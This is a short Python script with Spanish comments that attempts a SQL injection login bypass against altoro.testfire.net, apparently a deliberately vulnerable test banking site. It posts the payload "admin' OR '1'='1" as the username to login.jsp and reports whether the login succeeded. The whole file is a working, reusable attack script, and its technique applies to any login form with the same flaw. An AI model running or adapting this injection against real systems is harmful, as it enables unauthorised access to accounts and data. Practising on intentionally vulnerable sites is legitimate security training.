import requests
from bs4 import BeautifulSoup

# URL base del sitio web de prueba
base_url = 'http://altoro.testfire.net/'

# Función para obtener el token de autenticidad, si es necesario
def get_authenticity_token():
    login_page = requests.get(f"{base_url}login.jsp")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    # Asumiendo que hay un token de autenticidad en un input hidden en el formulario de login
    token_input = soup.find('input', {'name': 'authenticity_token'})
    if token_input:
        return token_input['value']
    return None

# Función para intentar hacer login con inyección SQL
def attempt_sql_injection(username, password):
    session = requests.Session()
    # Obtener token si es necesario (descomentar si se requiere)
    # token = get_authenticity_token()
    login_url = f"{base_url}login.jsp"

    # Datos del formulario con inyección SQL en el campo del usuario o contraseña
    login_data = {
        'uid': username,
        'passw': password,
        # Descomentar si se requiere un token de autenticidad
        # 'authenticity_token': token
    }

    # Realizar la petición POST con los datos del formulario
    response = session.post(login_url, data=login_data)

    if "Login Failed" not in response.text:
        print("¡Inyección SQL exitosa!")
    else:
        print("Inyección SQL fallida.")

# Ejemplo de uso
if __name__ == "__main__":
    # Estos valores deben ser ajustados a una inyección SQL que se conozca que funcione en el sitio
    malicious_username = "admin' OR '1'='1"
    malicious_password = "no_matter"
    attempt_sql_injection(malicious_username, malicious_password)
